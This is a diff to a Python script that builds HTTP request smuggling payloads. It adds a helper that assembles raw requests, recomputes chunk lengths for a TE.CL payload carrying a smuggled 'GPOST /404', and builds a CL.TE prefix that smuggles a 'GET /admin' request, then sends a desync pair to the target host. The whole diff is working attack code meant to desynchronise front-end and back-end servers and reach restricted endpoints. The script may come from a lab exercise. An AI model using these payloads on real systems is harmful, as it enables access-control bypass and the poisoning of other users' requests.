@@ -88,6 +88,18 @@ def send_pair(first, second):
     s.close()
 
 
+def req(method, path, body=b"", headers=None, keep=True):
+    headers = headers or {}
+    head = [
+        f"{method} {path} HTTP/1.1",
+        f"Host: {HOST}",
+        f"Connection: {'keep-alive' if keep else 'close'}",
+    ]
+    for k, v in headers.items():
+        head.append(f"{k}: {v}")
+    return ("\r\n".join(head) + "\r\n\r\n").encode() + body
+
+
 normal = (
     f"GET / HTTP/1.1\r\n"
     f"Host: {HOST}\r\n"
@@ -107,6 +119,12 @@ cl_te = (
     f"X"
 ).encode()
 
+smuggled_404 = (
+    f"GPOST /404 HTTP/1.1\r\n"
+    f"Host: {HOST}\r\n"
+    f"\r\n"
+).encode()
+
 te_cl = (
     f"POST / HTTP/1.1\r\n"
     f"Host: {HOST}\r\n"
@@ -114,27 +132,19 @@ te_cl = (
     f"Transfer-Encoding: chunked\r\n"
     f"Connection: keep-alive\r\n"
     f"\r\n"
-    f"12\r\n"
-    f"GPOST /404 HTTP/1.1\r\n"
-    f"Host: {HOST}\r\n"
-    f"\r\n"
-    f"0\r\n"
-    f"\r\n"
-).encode()
+).encode() + f"{len(smuggled_404):x}\r\n".encode() + smuggled_404 + b"0\r\n\r\n"
 
-prefix = (
-    f"POST / HTTP/1.1\r\n"
-    f"Host: {HOST}\r\n"
-    f"Content-Length: 45\r\n"
-    f"Transfer-Encoding: chunked\r\n"
-    f"Connection: keep-alive\r\n"
-    f"\r\n"
-    f"0\r\n"
-    f"\r\n"
+smuggled_admin = (
     f"GET /admin HTTP/1.1\r\n"
     f"Host: {HOST}\r\n"
     f"\r\n"
 ).encode()
+
+prefix_body = b"0\r\n\r\n" + smuggled_admin
+prefix = req("POST", "/", prefix_body, {
+    "Content-Length": str(len(prefix_body)),
+    "Transfer-Encoding": "chunked",
+})
 
 send_pair(cl_te, normal)
 # send_pair(te_cl, normal)
